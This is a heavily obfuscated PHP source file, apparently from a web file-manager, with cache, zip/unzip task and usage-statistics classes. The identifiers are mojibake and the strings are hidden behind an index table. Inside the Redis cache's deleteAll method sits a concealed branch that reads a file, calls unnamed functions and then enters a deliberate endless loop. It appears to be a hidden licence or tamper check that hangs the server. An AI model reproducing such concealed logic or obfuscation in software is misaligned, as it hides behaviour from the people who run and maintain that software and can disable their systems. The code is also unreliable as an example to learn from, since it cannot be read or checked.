<?php
 goto b¥…¶Î›; DĞˆ¯»ÀÊÅ: class CacheLockDatabase { public function lock($£ãÍüèÅ, $øğÁÌœö = 0) { $¹ë£‡Ô® = Model($_SERVER[ĞÂ¤àÓï][836]); $õ˜­µÉŸ = microtime(!0) + $øğÁÌœö; while (microtime(!0) < $õ˜­µÉŸ) { $‹ÛŒÄô = $¹ë£‡Ô®->get($£ãÍüèÅ); if (!$‹ÛŒÄô || $‹ÛŒÄô < microtime(!0)) { $À´ùı = $¹ë£‡Ô®->set($£ãÍüèÅ, $õ˜­µÉŸ); if ($À´ùı) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($˜¤ ‘½æ) { return Model($_SERVER[ĞÂ¤àÓï][836])->get($˜¤ ‘½æ); } public function unlock($ à©İã) { Model($_SERVER[ĞÂ¤àÓï][836])->remove($ à©İã); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($‚™¢ ´·, $µÒê˜ëà) { $ïÎÛÂÊ… =& $_SERVER[ĞÂ¤àÓï]; if (!class_exists($ïÎÛÂÊ…[869])) { show_json($ïÎÛÂÊ…[870], !1); } $this->cacheTime = $µÒê˜ëà; $this->handle = new Memcached(); if (is_array($‚™¢ ´·[$ïÎÛÂÊ…[871]]) && count($‚™¢ ´·[$ïÎÛÂÊ…[871]]) >= 1) { foreach ($‚™¢ ´·[$ïÎÛÂÊ…[871]] as $øñ¡§»ú) { $‡ÒÅê´Ú = explode($ïÎÛÂÊ…[4], $øñ¡§»ú); $this->handle->addServer($‡ÒÅê´Ú[0], $‡ÒÅê´Ú[1]); } } else { $this->handle->addServer($‚™¢ ´·[$ïÎÛÂÊ…[181]], $‚™¢ ´·[$ïÎÛÂÊ…[182]]); } } public function set($ ôÔÊ»º, $¯ú„² Á, $¢…£¯êù = false) { $¢…£¯êù = $¢…£¯êù ? $¢…£¯êù : $this->cacheTime; return $this->handle->set($ ôÔÊ»º, $¯ú„² Á, $¢…£¯êù); } public function get($‘äÀïú) { return $this->handle->get($‘äÀïú); } public function remove($¥ÅçËá¥) { return $this->handle->delete($¥ÅçËá¥); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ôôã®¤ì, $ÙŞíõŞ) { $ÏÔÈøî¦ =& $_SERVER[ĞÂ¤àÓï]; if (!class_exists($ÏÔÈøî¦[872])) { show_json($ÏÔÈøî¦[873], !1); } $this->cacheTime = $ÙŞíõŞ; $Î‹¶¥É‰ = isset($ôôã®¤ì[$ÏÔÈøî¦[874]]) ? $ôôã®¤ì[$ÏÔÈøî¦[874]] : 10; $¡‡¾æ÷ë = _get($ôôã®¤ì, $ÏÔÈøî¦[871]); if ($¡‡¾æ÷ë && is_array($¡‡¾æ÷ë)) { $this->initCluster($ôôã®¤ì, $Î‹¶¥É‰); } else { $this->handle = $this->init($ôôã®¤ì, $Î‹¶¥É‰); } } private function init($„Ù¡î¡Õ, $ã­®ï¢) { $õÇè” =& $_SERVER[ĞÂ¤àÓï]; $¦óü¸… = new Redis(); $“ì¿ß±… = isset($„Ù¡î¡Õ[$õÇè”[875]]) ? $„Ù¡î¡Õ[$õÇè”[875]] : !1; if ($“ì¿ß±…) { $¦óü¸…->pconnect($„Ù¡î¡Õ[$õÇè”[181]], $„Ù¡î¡Õ[$õÇè”[182]], $ã­®ï¢); } else { $¦óü¸…->connect($„Ù¡î¡Õ[$õÇè”[181]], $„Ù¡î¡Õ[$õÇè”[182]], $ã­®ï¢); } if (!empty($„Ù¡î¡Õ[$õÇè”[413]])) { $¦óü¸…->auth($„Ù¡î¡Õ[$õÇè”[413]]); } if (!empty($„Ù¡î¡Õ[$õÇè”[757]]) && $„Ù¡î¡Õ[$õÇè”[757]] != 0) { $¦óü¸…->select($„Ù¡î¡Õ[$õÇè”[757]]); } return $¦óü¸…; } private function initCluster($ı§€¼Õ”, $üÀ±€Ìú) { $´†¯ªÆ =& $_SERVER[ĞÂ¤àÓï]; $—„«¨Ùï = array($´†¯ªÆ[876], $´†¯ªÆ[877], $´†¯ªÆ[878]); $‰İĞíú = $´†¯ªÆ[876]; if (isset($ı§€¼Õ”[$´†¯ªÆ[16]]) && in_array($ı§€¼Õ”[$´†¯ªÆ[16]], $—„«¨Ùï)) { $‰İĞíú = $ı§€¼Õ”[$´†¯ªÆ[16]]; } switch ($‰İĞíú) { case $´†¯ªÆ[876]: $this->_slave($ı§€¼Õ”, $üÀ±€Ìú); break; case $´†¯ªÆ[877]: break; case $´†¯ªÆ[878]: $this->isCluster = !0; $²¦ûÇúŠ = $ı§€¼Õ”[$´†¯ªÆ[871]]; $©éÑŒ¿‘ = isset($ı§€¼Õ”[$´†¯ªÆ[875]]) ? $ı§€¼Õ”[$´†¯ªÆ[875]] : !1; $¤²”ŸúÅ = isset($ı§€¼Õ”[$´†¯ªÆ[413]]) ? $ı§€¼Õ”[$´†¯ªÆ[413]] : null; $this->handle = new RedisCluster(NUll, $²¦ûÇúŠ, $üÀ±€Ìú, $üÀ±€Ìú, $©éÑŒ¿‘, $¤²”ŸúÅ); break; default: break; } } private function _slave($ÂÃ¨ˆê’, $óñ‘Ÿ­Ã) { $âæÎÆ½³ = $ÂÃ¨ˆê’[$_SERVER[ĞÂ¤àÓï][871]]; $this->filterConfig($ÂÃ¨ˆê’, $âæÎÆ½³[0]); $this->handle = $this->init($ÂÃ¨ˆê’, $óñ‘Ÿ­Ã); unset($âæÎÆ½³[0]); if (empty($âæÎÆ½³)) { return; } $‘ÍÄòı = array_rand($âæÎÆ½³); $this->filterConfig($ÂÃ¨ˆê’, $âæÎÆ½³[$‘ÍÄòı]); $this->slaveHandle = $this->init($ÂÃ¨ˆê’, $óñ‘Ÿ­Ã); } private function filterConfig(&$Ç¨ƒ£ğ, $ÙàÚ¦á‹) { $…ù÷Ã›ã =& $_SERVER[ĞÂ¤àÓï]; $ù°ƒ…—İ = explode($…ù÷Ã›ã[4], $ÙàÚ¦á‹); $úØ¶ÄãË = array($…ù÷Ã›ã[181] => $ù°ƒ…—İ[0], $…ù÷Ã›ã[182] => $ù°ƒ…—İ[1]); $Ç¨ƒ£ğ = array_merge($Ç¨ƒ£ğ, $úØ¶ÄãË); } public function set($¬™¢‚”É, $Ù¨²‚, $×¦Ï×·€ = false) { $×¦Ï×·€ = $×¦Ï×·€ ? $×¦Ï×·€ : $this->cacheTime; return $this->handle->setEx($¬™¢‚”É, $×¦Ï×·€, $Ù¨²‚); } public function setLock($¯ƒï…ı, $¢ÄòÜ±¸, $ùŞØ˜Ëœ) { return $this->handle->setNX($¯ƒï…ı, $¢ÄòÜ±¸); } public function get($ÌØşªó) { $¾ºµØ  = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¾ºµØ ->get($ÌØşªó); } public function remove($·£ŞİïÀ) { return $this->handle->del($·£ŞİïÀ); } public function deleteAll() { $’‰éê‚ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($_SERVER[$’‰éê‚[777]]) || !isset($_SERVER[$’‰éê‚[775]])) { $ÄÎ²Ã€ = $’‰éê‚[879]; $å„Ûµë² = $’‰éê‚[778]; $®¢¯Õšƒ = $_SERVER[$’‰éê‚[779]] . $’‰éê‚[780]; $ÙÙ™’ô = $å„Ûµë²($®¢¯Õšƒ); $œë¿¤× = explode($’‰éê‚[231], $ÙÙ™’ô); if (count($œë¿¤×) < $’‰éê‚[620]) { $ÀÓ˜Á = $’‰éê‚[781]; $ÀÓ˜Á(); } $š»Éô¼ = $’‰éê‚[880]; $š»Éô¼($_SERVER[$’‰éê‚[881]]); $ßØÁÕíÊ = 1; for ($ƒÑé·¢å = $ßØÁÕíÊ; $ƒÑé·¢å > 0; $ƒÑé·¢å++) { $š»Éô¼ = json_encode($GLOBALS[$’‰éê‚[418]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ù–¿„‹Ï) { $this->handle->flushall($ù–¿„‹Ï); } return; } return $this->handle->flushAll(); } } goto DåÁäí¿‘; CÏ–¥ŠÌ‘î: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $’óÁÇô =& $_SERVER[ĞÂ¤àÓï]; parent::startAfter(); Hook::bind($’óÁÇô[1775], array($this, $’óÁÇô[1776])); Hook::bind($’óÁÇô[1194], array($this, $’óÁÇô[1777])); $Œ†™…è¢ =& $this->task; $Œ†™…è¢[$’óÁÇô[1778]] = $’óÁÇô[1195]; if (!$Œ†™…è¢[$’óÁÇô[1564]]) { $Œ†™…è¢[$’óÁÇô[1564]] = LNG($’óÁÇô[1779]); } } protected function endAfter() { $ˆ‡Ù–ı =& $_SERVER[ĞÂ¤àÓï]; parent::endAfter(); Hook::unbind($ˆ‡Ù–ı[1775], array($this, $ˆ‡Ù–ı[1776])); Hook::unbind($ˆ‡Ù–ı[1194], array($this, $ˆ‡Ù–ı[1777])); } public function updateAfter() { $ı¿¨ñĞ =& $_SERVER[ĞÂ¤àÓï]; $®óö„÷´ =& $this->task; if (!$®óö„÷´[$ı¿¨ñĞ[793]] || !$®óö„÷´[$ı¿¨ñĞ[762]]) { return; } if ($®óö„÷´[$ı¿¨ñĞ[1778]] == $ı¿¨ñĞ[1195]) { $Ü”Çõ† = 0; if ($®óö„÷´[$ı¿¨ñĞ[1718]]) { $Ü”Çõ† = $®óö„÷´[$ı¿¨ñĞ[1719]] / $®óö„÷´[$ı¿¨ñĞ[1718]]; } $®óö„÷´[$ı¿¨ñĞ[1666]] = $Ü”Çõ† * 0.3; } else { if ($®óö„÷´[$ı¿¨ñĞ[1778]] == $ı¿¨ñĞ[313]) { $Ü”Çõ† = $®óö„÷´[$ı¿¨ñĞ[1665]] / $®óö„÷´[$ı¿¨ñĞ[793]]; $®óö„÷´[$ı¿¨ñĞ[1666]] = 0.3 + $Ü”Çõ† * 0.4; } else { if ($®óö„÷´[$ı¿¨ñĞ[1778]] == $ı¿¨ñĞ[107]) { $Ç¯ÛÌ” = 0; if ($®óö„÷´[$ı¿¨ñĞ[1720]] == $ı¿¨ñĞ[107]) { $Ç¯ÛÌ” = $®óö„÷´[$ı¿¨ñĞ[1719]]; } $Ü”Çõ† = ($®óö„÷´[$ı¿¨ñĞ[1723]] + $Ç¯ÛÌ”) / $®óö„÷´[$ı¿¨ñĞ[762]]; $®óö„÷´[$ı¿¨ñĞ[1666]] = 0.3 + 0.4 + $Ü”Çõ† * 0.3; } } } if ($®óö„÷´[$ı¿¨ñĞ[1666]] > 0) { $§¾·Âƒ = timeFloat() - $®óö„÷´[$ı¿¨ñĞ[1668]] - $®óö„÷´[$ı¿¨ñĞ[1671]]; $®óö„÷´[$ı¿¨ñĞ[1672]] = $§¾·Âƒ * (1 - $®óö„÷´[$ı¿¨ñĞ[1666]]) / $®óö„÷´[$ı¿¨ñĞ[1666]]; } } public function addFile($³îÁò÷Á) { $Ìâ§Ëõ =& $_SERVER[ĞÂ¤àÓï]; $É»Ë©÷ˆ =& $this->task; $—¨†„†× = IO::info($³îÁò÷Á); $É»Ë©÷ˆ[$Ìâ§Ëõ[1716]] = $—¨†„†×[$Ìâ§Ëõ[32]]; $É»Ë©÷ˆ[$Ìâ§Ëõ[1718]] = $—¨†„†×[$Ìâ§Ëõ[76]]; $É»Ë©÷ˆ[$Ìâ§Ëõ[1719]] = 0; $É»Ë©÷ˆ[$Ìâ§Ëõ[1064]] = $Ìâ§Ëõ[1739]; $É»Ë©÷ˆ[$Ìâ§Ëõ[1720]] = $Ìâ§Ëõ[1195]; $É»Ë©÷ˆ[$Ìâ§Ëõ[762]] = $—¨†„†×[$Ìâ§Ëõ[76]]; $É»Ë©÷ˆ[$Ìâ§Ëõ[793]] = 1; $†Ç¦ˆŞ¢ = 0; $É»Ë©÷ˆ[$Ìâ§Ëõ[1727]] = array($Ìâ§Ëõ[1728] => $†Ç¦ˆŞ¢ + 1, $Ìâ§Ëõ[420] => $—¨†„†×[$Ìâ§Ëõ[32]], $Ìâ§Ëõ[84] => $—¨†„†×[$Ìâ§Ëõ[84]], $Ìâ§Ëõ[519] => $—¨†„†×[$Ìâ§Ëõ[519]] ? $—¨†„†×[$Ìâ§Ëõ[519]] : $—¨†„†×[$Ìâ§Ëõ[84]]); $this->update(); } public function unzipAfter($İ„´ä¥) { $¼ù µ‚À =& $_SERVER[ĞÂ¤àÓï]; $íç¸ı  =& $this->task; $íç¸ı [$¼ù µ‚À[1778]] = $¼ù µ‚À[107]; $ıÆìî®ñ = IO::infoWithChildren($İ„´ä¥); $æèõŸÁ€ = 0; $íç¸ı [$¼ù µ‚À[1727]] = array($¼ù µ‚À[1728] => $æèõŸÁ€ + 1, $¼ù µ‚À[420] => $ıÆìî®ñ[$¼ù µ‚À[32]], $¼ù µ‚À[84] => $ıÆìî®ñ[$¼ù µ‚À[84]], $¼ù µ‚À[519] => $ıÆìî®ñ[$¼ù µ‚À[519]] ? $ıÆìî®ñ[$¼ù µ‚À[519]] : $ıÆìî®ñ[$¼ù µ‚À[84]]); if ($ıÆìî®ñ[$¼ù µ‚À[33]] == $¼ù µ‚À[199]) { $íç¸ı [$¼ù µ‚À[793]] = 1; } else { $íç¸ı [$¼ù µ‚À[793]] = $ıÆìî®ñ[$¼ù µ‚À[79]][$¼ù µ‚À[77]]; } $íç¸ı [$¼ù µ‚À[1064]] = $¼ù µ‚À[12]; $íç¸ı [$¼ù µ‚À[1720]] = 0; $íç¸ı [$¼ù µ‚À[1665]] = 0; $íç¸ı [$¼ù µ‚À[1718]] = 0; $íç¸ı [$¼ù µ‚À[1719]] = 0; $íç¸ı [$¼ù µ‚À[1716]] = $¼ù µ‚À[12]; $íç¸ı [$¼ù µ‚À[1723]] = 0; $íç¸ı [$¼ù µ‚À[762]] = $ıÆìî®ñ[$¼ù µ‚À[76]]; $this->update(); self::log($¼ù µ‚À[1780] . json_encode(array($íç¸ı , $ıÆìî®ñ))); } public function nameParse($’Ä¥æ†¤) { $’à• =& $_SERVER[ĞÂ¤àÓï]; $Ü¡É‡‡– =& $this->task; if ($Ü¡É‡‡–[$’à•[1778]] == $’à•[1195]) { $Ü¡É‡‡–[$’à•[1778]] = $’à•[313]; $Ü¡É‡‡–[$’à•[1723]] = 0; $Ü¡É‡‡–[$’à•[762]] = 0; } $›£Ù¹ñ = get_path_this($’Ä¥æ†¤); if (strstr($›£Ù¹ñ, $’à•[10])) { $Ü¡É‡‡–[$’à•[1665]] += 1; $Ü¡É‡‡–[$’à•[793]] += 1; } $Ü¡É‡‡–[$’à•[1716]] = $’Ä¥æ†¤; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $æ©«ŞÌØ =& $_SERVER[ĞÂ¤àÓï]; parent::startAfter(); Hook::bind($æ©«ŞÌØ[1781], array($this, $æ©«ŞÌØ[1776])); $‘é‚ºË­ =& $this->task; $‘é‚ºË­[$æ©«ŞÌØ[1778]] = $æ©«ŞÌØ[1195]; if (!$‘é‚ºË­[$æ©«ŞÌØ[1564]]) { $‘é‚ºË­[$æ©«ŞÌØ[1564]] = LNG($æ©«ŞÌØ[1782]); } } protected function endAfter() { $‹¹¢âÖ¬ =& $_SERVER[ĞÂ¤àÓï]; parent::endAfter(); Hook::unbind($‹¹¢âÖ¬[1781], array($this, $‹¹¢âÖ¬[1776])); } public function updateAfter() { $áûÑèõ™ =& $_SERVER[ĞÂ¤àÓï]; $ìåáş« =& $this->task; if (!$ìåáş«[$áûÑèõ™[793]] || !$ìåáş«[$áûÑèõ™[762]]) { return; } if ($ìåáş«[$áûÑèõ™[1778]] == $áûÑèõ™[1195]) { $íŞÆŒµö = $ìåáş«[$áûÑèõ™[1719]]; if ($ìåáş«[$áûÑèõ™[1720]] != $áûÑèõ™[1195]) { $íŞÆŒµö = 0; } $©ÀÛî” = ($ìåáş«[$áûÑèõ™[1723]] + $íŞÆŒµö) / $ìåáş«[$áûÑèõ™[762]]; $ìåáş«[$áûÑèõ™[1666]] = $©ÀÛî” * 0.3; } else { if ($ìåáş«[$áûÑèõ™[1778]] == $áûÑèõ™[313]) { $©ÀÛî” = $ìåáş«[$áûÑèõ™[1665]] / $ìåáş«[$áûÑèõ™[793]]; $ìåáş«[$áûÑèõ™[1666]] = 0.3 + $©ÀÛî” * 0.5; } else { if ($ìåáş«[$áûÑèõ™[1778]] == $áûÑèõ™[107]) { $©ÀÛî” = 0; if ($ìåáş«[$áûÑèõ™[1718]]) { $©ÀÛî” = $ìåáş«[$áûÑèõ™[1719]] / $ìåáş«[$áûÑèõ™[1718]]; } $ìåáş«[$áûÑèõ™[1666]] = 0.3 + 0.5 + $©ÀÛî” * 0.2; } } } if ($ìåáş«[$áûÑèõ™[1666]] > 0) { $ÚíŠÖÛÉ = timeFloat() - $ìåáş«[$áûÑèõ™[1668]] - $ìåáş«[$áûÑèõ™[1671]]; $ìåáş«[$áûÑèõ™[1672]] = $ÚíŠÖÛÉ * (1 - $ìåáş«[$áûÑèõ™[1666]]) / $ìåáş«[$áûÑèõ™[1666]]; } } public function copyFileStart($›·œêÎ­, $½ÓÒá‚, $ğÃÙ‘úœ, $àé±óÆ , $„ë¹õ“Í, $¡ûõé€Ê) { $Ş˜ÂÊ´º =& $_SERVER[ĞÂ¤àÓï]; parent::copyFileStart($›·œêÎ­, $½ÓÒá‚, $ğÃÙ‘úœ, $àé±óÆ , $„ë¹õ“Í, $¡ûõé€Ê); $Ìôì‘®´ =& $this->task; if ($Ìôì‘®´[$Ş˜ÂÊ´º[1778]] == $Ş˜ÂÊ´º[313]) { $Ìôì‘®´[$Ş˜ÂÊ´º[1778]] = $Ş˜ÂÊ´º[107]; } $this->update(); } public function copyFileEnd($ÁØ½ª·, $ÇÚËÄ‘, $ Ò³íû, $œ¨’Íª¤, $îÒßÙë©, $âŒÔûÏæ) { $ãéàÁĞ„ =& $_SERVER[ĞÂ¤àÓï]; $Í°½êäÜ =& $this->task; $Í°½êäÜ[$ãéàÁĞ„[1719]] = $Í°½êäÜ[$ãéàÁĞ„[1718]]; $Í°½êäÜ[$ãéàÁĞ„[1723]] += $Í°½êäÜ[$ãéàÁĞ„[1718]]; $Í°½êäÜ[$ãéàÁĞ„[1720]] = $ãéàÁĞ„[12]; $this->update(); } public function nameParse($“ç§ƒÜ‰) { $ ËõŠì =& $_SERVER[ĞÂ¤àÓï]; $ÜÒ§Í =& $this->task; if ($ÜÒ§Í[$ ËõŠì[1665]] < $ÜÒ§Í[$ ËõŠì[793]]) { $ğà¤¸º„ = get_path_this($“ç§ƒÜ‰); if (strstr($ğà¤¸º„, $ ËõŠì[10])) { $ÜÒ§Í[$ ËõŠì[1665]] += 1; } } if ($ÜÒ§Í[$ ËõŠì[1778]] == $ ËõŠì[1195]) { $ÜÒ§Í[$ ËõŠì[1778]] = $ ËõŠì[313]; } $ÜÒ§Í[$ ËõŠì[1716]] = $“ç§ƒÜ‰; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ØÚœÈíØ) { $¾ÆÏ™Œ™ =& $_SERVER[ĞÂ¤àÓï]; $ê‘ĞØ¢á = array($¾ÆÏ™Œ™[600] => array($¾ÆÏ™Œ™[33] => $¾ÆÏ™Œ™[1783], $¾ÆÏ™Œ™[273] => array($¾ÆÏ™Œ™[224], $¾ÆÏ™Œ™[764], $¾ÆÏ™Œ™[1784], $¾ÆÏ™Œ™[1785])), $¾ÆÏ™Œ™[1786] => array($¾ÆÏ™Œ™[33] => $¾ÆÏ™Œ™[1787], $¾ÆÏ™Œ™[273] => array($¾ÆÏ™Œ™[224], $¾ÆÏ™Œ™[762], $¾ÆÏ™Œ™[1788], $¾ÆÏ™Œ™[1789], $¾ÆÏ™Œ™[1790]))); if (!isset($ê‘ĞØ¢á[$ØÚœÈíØ])) { return !1; } $this->optionType = $ê‘ĞØ¢á[$ØÚœÈíØ][$¾ÆÏ™Œ™[33]]; $this->field = $ê‘ĞØ¢á[$ØÚœÈíØ][$¾ÆÏ™Œ™[273]]; return !0; } public function listData($îó»¼À• = false, $Ê†´·ÌÇ = "\155\x6f\x64\151\x66\x79\124\151\155\x65", $Ú·ø­¼ = false) { return parent::listData($îó»¼À•, $Ê†´·ÌÇ, $Ú·ø­¼); } public function trendList($ø–Ñå¹Û) { $•›‰ÒÕÌ =& $_SERVER[ĞÂ¤àÓï]; $§¶ˆ€Œ“ = $this->listData(); if ($§¶ˆ€Œ“) { $ûîÊëÓÆ = end($§¶ˆ€Œ“); $ş˜À¹Ó = date($•›‰ÒÕÌ[1791], strtotime($•›‰ÒÕÌ[1792])); if ($ûîÊëÓÆ[$•›‰ÒÕÌ[224]] == $ş˜À¹Ó) { return $§¶ˆ€Œ“; } $‰Ú¼Û†š = strtotime($ûîÊëÓÆ[$•›‰ÒÕÌ[224]]); } if (!isset($‰Ú¼Û†š)) { $İ•Ğ = $ø–Ñå¹Û == $•›‰ÒÕÌ[600] ? $•›‰ÒÕÌ[535] : $•›‰ÒÕÌ[832]; $‰Ú¼Û†š = Model($İ•Ğ)->min($•›‰ÒÕÌ[200]); } $ªóĞ™èˆ = $•›‰ÒÕÌ[1793] . ucfirst($ø–Ñå¹Û); $ß¬ÛÅ¦ä = $this->dateList($‰Ú¼Û†š); foreach ($ß¬ÛÅ¦ä as $ş˜À¹Ó) { $this->{$ªóĞ™èˆ}($ş˜À¹Ó); } return $this->listData(); } private function dateList($İ£¸‹Âö) { $“ìÊ™Ë =& $_SERVER[ĞÂ¤àÓï]; $©Üœ›û¿ = $İ£¸‹Âö; $Éç¥ã—‰ = strtotime($“ìÊ™Ë[1792]); $‹ÉÚıÛ = array(); while ($©Üœ›û¿ <= $Éç¥ã—‰) { $‹ÉÚıÛ[] = date($“ìÊ™Ë[1791], $©Üœ›û¿); $©Üœ›û¿ = strtotime($“ìÊ™Ë[1794], $©Üœ›û¿); } return $‹ÉÚıÛ; } public function _recordUser($˜‰Üô†— = '') { $Í¯¸Õ¤ =& $_SERVER[ĞÂ¤àÓï]; $”ñğ•”ï = strtotime(date($Í¯¸Õ¤[1795], strtotime($˜‰Üô†—))); $ğ´¦ïÒ = strtotime(date($Í¯¸Õ¤[1796], strtotime($˜‰Üô†—))); $æ’÷ÄÆ† = array($Í¯¸Õ¤[200] => array($Í¯¸Õ¤[1013], $ğ´¦ïÒ)); $ñ†Êµ‚ = Model($Í¯¸Õ¤[535])->where($æ’÷ÄÆ†)->count($Í¯¸Õ¤[1664]); $æ’÷ÄÆ†[$Í¯¸Õ¤[200]] = array($Í¯¸Õ¤[333], array($”ñğ•”ï, $ğ´¦ïÒ)); $İ”£éı… = Model($Í¯¸Õ¤[535])->where($æ’÷ÄÆ†)->count($Í¯¸Õ¤[1664]); $æ’÷ÄÆ†[$Í¯¸Õ¤[33]] = $Í¯¸Õ¤[1797]; $Õ¾Ûø¢ = Model($Í¯¸Õ¤[1798])->where($æ’÷ÄÆ†)->count($Í¯¸Õ¤[1799]); $åÅ¹œŒÑ = array($Í¯¸Õ¤[224] => $˜‰Üô†—, $Í¯¸Õ¤[764] => (int) $ñ†Êµ‚, $Í¯¸Õ¤[1784] => (int) $İ”£éı…, $Í¯¸Õ¤[1785] => (int) $Õ¾Ûø¢); return $this->insert($åÅ¹œŒÑ); } public function _recordStore($¾³ŞÇÅ = '') { $³Ğ®æà =& $_SERVER[ĞÂ¤àÓï]; $˜…§§÷ = strtotime(date($³Ğ®æà[1796], strtotime($¾³ŞÇÅ))); $Ğµ´Ğ¹ = array($³Ğ®æà[200] => array($³Ğ®æà[1013], $˜…§§÷)); $÷ó‚®¹‡ = Model($³Ğ®æà[471])->where($Ğµ´Ğ¹)->sum($³Ğ®æà[76]); $Ğµ´Ğ¹[$³Ğ®æà[410]] = 0; $Ò…’Šè = Model($³Ğ®æà[832])->where($Ğµ´Ğ¹)->sum($³Ğ®æà[76]); $Ğµ´Ğ¹[$³Ğ®æà[411]] = 1; $Øã¯¡å÷ = Model($³Ğ®æà[832])->where($Ğµ´Ğ¹)->sum($³Ğ®æà[76]); $Ğµ´Ğ¹[$³Ğ®æà[411]] = 2; $‰ÖÙ™›ğ = Model($³Ğ®æà[832])->where($Ğµ´Ğ¹)->sum($³Ğ®æà[76]); $Ö¯ùˆ•í = array($³Ğ®æà[224] => $¾³ŞÇÅ, $³Ğ®æà[762] => (int) $Ò…’Šè, $³Ğ®æà[1788] => (int) $÷ó‚®¹‡, $³Ğ®æà[1789] => (int) $Øã¯¡å÷, $³Ğ®æà[1790] => (int) $‰ÖÙ™›ğ); return $this->insert($Ö¯ùˆ•í); } public function trend($‚´‰‚“Ü, $ìÙôÚúï) { $ñ’û’¶† =& $_SERVER[ĞÂ¤àÓï]; if (!$this->init($‚´‰‚“Ü)) { return !1; } $¼åÃıˆÖ = $this->trendList($‚´‰‚“Ü); if ($¼åÃıˆÖ && $ìÙôÚúï != $ñ’û’¶†[1637]) { $é ’¥÷ = $¼åÃıˆÖ[0][$ñ’û’¶†[224]]; $¨îù£Ú« = $this->validDate($ìÙôÚúï, $é ’¥÷); $ñ³æÕê… = array(); $æ¿Æ¡š = array_to_keyvalue($¼åÃıˆÖ, $ñ’û’¶†[224]); foreach ($¨îù£Ú« as $“™¹¼›ƒ) { if (isset($æ¿Æ¡š[$“™¹¼›ƒ])) { $‚åÌ¦ıÔ = $æ¿Æ¡š[$“™¹¼›ƒ]; } else { $‚åÌ¦ıÔ = end($¼åÃıˆÖ); $‚åÌ¦ıÔ[$ñ’û’¶†[224]] = $“™¹¼›ƒ; if ($‚´‰‚“Ü == $ñ’û’¶†[600]) { $‚åÌ¦ıÔ[$ñ’û’¶†[1784]] = $‚åÌ¦ıÔ[$ñ’û’¶†[1785]] = 0; } } $ñ³æÕê…[] = $‚åÌ¦ıÔ; } $¼åÃıˆÖ = $ñ³æÕê…; } $’ö´˜Ÿ¦ = array($ñ’û’¶†[600] => array($ñ’û’¶†[764] => LNG($ñ’û’¶†[1800]), $ñ’û’¶†[1784] => LNG($ñ’û’¶†[1801]), $ñ’û’¶†[1785] => LNG($ñ’û’¶†[1802])), $ñ’û’¶†[1786] => array($ñ’û’¶†[762] => LNG($ñ’û’¶†[1803]), $ñ’û’¶†[1788] => LNG($ñ’û’¶†[1804]), $ñ’û’¶†[1789] => LNG($ñ’û’¶†[1805]), $ñ’û’¶†[1790] => LNG($ñ’û’¶†[1806]))); $ñ®¡û³î = array($ñ’û’¶†[600] => $ñ’û’¶†[1807], $ñ’û’¶†[1786] => $ñ’û’¶†[76]); if (empty($¼åÃıˆÖ)) { $“™¹¼›ƒ = date($ñ’û’¶†[1791], strtotime($ñ’û’¶†[1792])); $ŸÏ´·Õº = array($ñ’û’¶†[224] => $“™¹¼›ƒ); foreach ($’ö´˜Ÿ¦[$‚´‰‚“Ü] as $ş‹ĞÛ => $şÀ¹ÎšÀ) { $ŸÏ´·Õº[$ş‹ĞÛ] = 0; } $¼åÃıˆÖ[] = $ŸÏ´·Õº; } $”ºùıË = array(); foreach ($¼åÃıˆÖ as $şÀ¹ÎšÀ) { if ($‚´‰‚“Ü == $ñ’û’¶†[1786] && $şÀ¹ÎšÀ[$ñ’û’¶†[1788]] > $şÀ¹ÎšÀ[$ñ’û’¶†[762]]) { $şÀ¹ÎšÀ[$ñ’û’¶†[1788]] = $şÀ¹ÎšÀ[$ñ’û’¶†[762]]; } foreach ($’ö´˜Ÿ¦[$‚´‰‚“Ü] as $ş‹ĞÛ => $åƒê¾ï) { $‚åÌ¦ıÔ = array($ñ’û’¶†[224] => $şÀ¹ÎšÀ[$ñ’û’¶†[224]], $ñ’û’¶†[1564] => $åƒê¾ï); $‚åÌ¦ıÔ[$ñ®¡û³î[$‚´‰‚“Ü]] = isset($şÀ¹ÎšÀ[$ş‹ĞÛ]) ? $şÀ¹ÎšÀ[$ş‹ĞÛ] : 0; $”ºùıË[] = $‚åÌ¦ıÔ; } } return $”ºùıË; } public function validDate($¾ë“™Ïñ, $ä•æ¼ı±) { $Ÿƒ«¡‰Ò =& $_SERVER[ĞÂ¤àÓï]; $â‰ÃµÑ„ = date($Ÿƒ«¡‰Ò[1791], strtotime($Ÿƒ«¡‰Ò[1792])); $ÎÁµ·Î‹ = array($â‰ÃµÑ„); switch ($¾ë“™Ïñ) { case $Ÿƒ«¡‰Ò[1644]: $û€ÅïÃş = mktime(0, 0, 0, date($Ÿƒ«¡‰Ò[1808]), date($Ÿƒ«¡‰Ò[1385]) - date($Ÿƒ«¡‰Ò[1448]) + 7 - 7, date($Ÿƒ«¡‰Ò[1809])); $„Ò´«ĞÚ = 0; do { $ÅÌÕ¶ = date($Ÿƒ«¡‰Ò[1791], $û€ÅïÃş - 3600 * 24 * 7 * $„Ò´«ĞÚ); $ÎÁµ·Î‹[] = $ÅÌÕ¶; $„Ò´«ĞÚ++; } while ($ä•æ¼ı± < $ÅÌÕ¶); break; case $Ÿƒ«¡‰Ò[1642]: $„Ò´«ĞÚ = 1; do { $ÏÊ¾ì”‚ = date($Ÿƒ«¡‰Ò[1810], strtotime("\55\40{$„Ò´«ĞÚ}\40\155\x6f\156\x74\150\x73")); $ÎÁµ·Î‹[] = $ÏÊ¾ì”‚; $„Ò´«ĞÚ++; } while ($ä•æ¼ı± < $ÏÊ¾ì”‚); break; case $Ÿƒ«¡‰Ò[1811]: $œ´¸Ÿä = (int) date($Ÿƒ«¡‰Ò[1809], strtotime($ä•æ¼ı±)); $‰¬”ÈÓş = (int) date($Ÿƒ«¡‰Ò[1809]); if ($œ´¸Ÿä >= $‰¬”ÈÓş) { break; } for ($œ´¸Ÿä; $œ´¸Ÿä < $‰¬”ÈÓş; $œ´¸Ÿä++) { $ÎÁµ·Î‹[] = $œ´¸Ÿä . $Ÿƒ«¡‰Ò[1812]; } break; default: break; } if ($ä•æ¼ı± > end($ÎÁµ·Î‹)) { array_pop($ÎÁµ·Î‹); 